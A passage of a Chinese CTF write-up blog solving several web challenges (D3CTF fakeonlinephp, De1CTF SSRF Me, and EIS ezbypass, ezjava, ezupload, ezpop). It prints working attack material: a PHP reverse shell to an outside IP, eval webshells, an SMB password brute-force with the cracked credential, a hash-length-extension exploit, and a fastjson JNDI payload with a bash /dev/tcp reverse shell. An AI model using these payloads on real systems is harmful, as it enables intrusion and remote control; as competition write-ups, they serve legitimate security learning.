#</span><br></pre></td></tr></table></figure>
<p>得到<strong>d3ctf{Th4at's_A_Si11y_P0p_chi4n}</strong>，似乎非预期了。</p>
<h3 id="fakeonlinephp">fakeonlinephp</h3>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;orange&#x27;</span>]) &amp;&amp; @<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;@&lt;?php&#x27;</span> ? <span class="keyword">include</span>(<span class="variable">$_</span>) : <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>扫描一下，一个<strong>.git</strong>泄漏，提示了内网，还有字典，并得知是<strong>Windows</strong>服务器。</p>
<p>根据源码，尝试了一下伪协议包含，<strong>/?orange=data://text/plain;base64,QDw/cGhw</strong>，弹了三个<strong>Warning</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</span><br><span class="line"></span><br><span class="line">Warning: include(data://text/plain;base64,QDw/cGhw): failed to open stream: no suitable wrapper could be found in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#x27;data://text/plain;base64,QDw/cGhw&#x27; for inclusion (include_path=&#x27;.;C:\php\pear&#x27;) in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</span><br></pre></td></tr></table></figure>
<p><a
href="https://byqiyou.github.io/">七友</a>师傅指出可以用包含<strong>Webdav</strong>和<strong>SMB</strong>服务的方式绕过。</p>
<p>那么起一个服务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</span><br></pre></td></tr></table></figure>
<p>然后在服务下写<strong>Shell</strong>，先测试一下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim webdav/data/south.php</span><br><span class="line"></span><br><span class="line">@&lt;?php phpinfo();</span><br></pre></td></tr></table></figure>
<p>然后访问<strong>/?orange=//122.51.113.164//webdav/south.php</strong>，显示成功。</p>
<p>尝试包含一句话，失败了，应该是开启了<strong>Windows
Defender</strong>，于是尝试直接反弹<strong>Shell</strong>。</p>
<p>这儿<strong>Webdav</strong>似有缓存，另起一个。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">vim webdav/data/sea.php</span><br><span class="line"></span><br><span class="line">@<span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&quot;122.51.113.164&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="string">&quot;2333&quot;</span>;</span><br><span class="line"><span class="variable">$fp</span> = @<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="string">&quot;\n++++++++++connect success++++++++\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="string">&quot;shell:&quot;</span>);</span><br><span class="line">        <span class="variable">$shell</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="variable">$message</span> = `<span class="variable">$shell</span>`;</span><br><span class="line">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="variable">$message</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拿到反弹<strong>Shell</strong>后方便很多，但是根据<strong>.git</strong>中的提示，还需要内网渗透，因此需要传一些工具，我还是决定写一个<strong>WebShell</strong>进去。</p>
<p>经过尝试，发现诸如**<span
class="math inline">\(_POST[&#39;south&#39;]**、**\)</span>_GET['south']<strong>之类的无法写入，可以用</strong>{}<strong>代替</strong>[]<strong>，且</strong>Web**目录下无写权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo @^&lt;?php eval(($_POST)&#123;south&#125;)?^&gt; &gt; C:\Users\w1nd\Desktop\web\nginx-1.17.6\south</span><br></pre></td></tr></table></figure>
<p>蚁剑连一下，快乐多了，再传个<strong>Hydra</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l administrator -P dict.txt smb://172.19.97.8</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-26 13:34:15</span><br><span class="line">[DATA] max 1 task per 1 server, overall 1 task, 10000 login tries (l:1/p:0), ~10000 tries per task</span><br><span class="line">[DATA] attacking smb://172.19.97.8:445/</span><br><span class="line">[STATUS] 3646.00 tries/min, 3646 tries in 00:00h, 0 to do in 01:00h, 6354 active</span><br><span class="line">[445][smb] host: 172.19.97.8   login: administrator   password: eDHU27TlY6ugslV</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-11-26 13:36:00</span><br></pre></td></tr></table></figure>
<p>拿到了密码，尝试登陆。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\172.19.97.8\c$ eDHU27TlY6ugslV /user:172_19_97_8\administrator</span><br></pre></td></tr></table></figure>
<p>然后获取<strong>flag</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type \\172.19.97.8\c$\Users\Administrator\Desktop\flag.txt</span><br><span class="line"></span><br><span class="line">d3ctf&#123;Sh3ll_fr0m_ur1111_inc1ude!1!!!_soCoooool&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 De1CTF 部分题解</title>
    <url>/2019-De1CTF/</url>
    <content><![CDATA[<p>。</p>
<span id="more"></span>
<h3 id="ssrf-me">SSRF Me</h3>
<p>源码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="comment">#Author=She1don</span></span><br><span class="line"><span class="comment">#Date=2019/07/09</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>这题一共出现了两种非预期，算上预期解一共三种解法。</p>
<h4 id="hash拓展攻击">HASH拓展攻击</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">south@Antarctica ~ hashpump</span><br><span class="line">Input Signature: 8370bdba94bd5aaf7427b84b3f52d7cb</span><br><span class="line">Input Data: scan</span><br><span class="line">Input Key Length: 24</span><br><span class="line">Input Data to Add: read</span><br><span class="line">d7163f39ab78a698b3514fd465e4018a</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x</span><br><span class="line">00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>
<p>然后构造<strong>EXP</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://139.180.128.86/De1ta?param=flag.txt&#x27;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;sign&#x27;</span>: <span class="string">&#x27;d7163f39ab78a698b3514fd465e4018a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>:</span><br><span class="line"><span class="string">&#x27;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line"><span class="built_in">print</span> res.text</span><br></pre></td></tr></table></figure>
<h4 id="字符串拼接">字符串拼接</h4>
<p>此处的字符串拼接以及校验存在漏洞，这是生成的MD5校验码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>这是处理的逻辑。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">    tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    resp = scan(self.param)</span><br><span class="line">    <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">        result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp)</span><br><span class="line">        tmpfile.write(resp)</span><br><span class="line">        tmpfile.close()</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br></pre></td></tr></table></figure>
<p>先判断<strong>action</strong>中是否有<strong>scan</strong>，再判断是否有<strong>read</strong>，也就是说，当两者同时存在的时候，都会执行。</p>
<p>那么这时就不需要前面的<strong>HASH</strong>拓展攻击了，只需直接构造访问<strong>/geneSign?param=flag.txtread</strong>，这时传到<strong>getSign()</strong>函数中拼接成的字符串就是<strong>secert_key+"flag.txtreadscan"</strong>，使用返回的<strong>MD5</strong>访问<strong>/De1ta?param=flag.txt</strong>，同时构造<strong>action=readscan;</strong>即可。</p>
<h4 id="预期解">预期解</h4>
<p>使用<strong>local_file</strong>协议读取，出题人预先并没留意到<strong>urllib.urlopen()</strong>函数可以直接读取文件。</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 高校网络信息安全管理运维挑战赛 部分题解</title>
    <url>/2019-EIS/</url>
    <content><![CDATA[<p>这个幼儿园也太牛逼了。</p>
<span id="more"></span>
<h3 id="web">Web</h3>
<h4 id="ezbypass">ezbypass</h4>
<p>直接写个🐎。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=file_put_contents(&quot;/tmp/south.php&quot;,&quot;&lt;?php eval(\$_POST[&#x27;south&#x27;]);?&gt;&quot;);</span><br></pre></td></tr></table></figure>
<p>然后蚁剑右键绕过<strong>disable_function</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag&#123;bypass_disable_function_by_Nday_9e0c14fbba82b37&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ezjava">ezjava</h4>
<p>没啥好说的，<a
href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE"><strong>fastjson-1.2.47-RCE</strong>漏洞复现</a>。</p>
<p>修改<strong>Exploit.java</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/123.123.123.123/7777 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译后启用服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java - marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://123123123/#Exploit</span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
<p>然后发送<strong>Payload</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /ezjava/ HTTP/1.1</span><br><span class="line">Host: 111.186.57.123:10301</span><br><span class="line">Content-Length: 193</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://111.186.57.123:10301</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://111.186.57.123:10301/ezjava/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=6074c295e31bd370d9c8839b0ea19491</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://123.123.123.123:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>监听到反弹<strong>Shell</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;jndi_injection_by_ldap_3232&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ezupload">ezupload</h4>
<p>提示了<strong>login.php.swp</strong>，看了一下，发送空用户名不发送密码就可以绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.186.57.61:10501/</span><br><span class="line">username=south</span><br></pre></td></tr></table></figure>
<p>上🐴，修改文件头为<strong>GIF89a</strong>，后缀名为<strong>phtml</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 111.186.57.123:10501</span><br><span class="line">Content-Length: 227</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://111.186.57.123:10501</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAJC3JWBX6v0GXTQe</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://111.186.57.123:10501/upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=6074c295e31bd370d9c8839b0ea19491</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAJC3JWBX6v0GXTQe</span><br><span class="line">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;south.phtml&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#x27;south&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAJC3JWBX6v0GXTQe--</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{logical_bypass_not_weak_password}</strong>。</p>
<h4 id="ezpop">ezpop</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key    = <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store  = <span class="variable">$store</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="variable language_">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    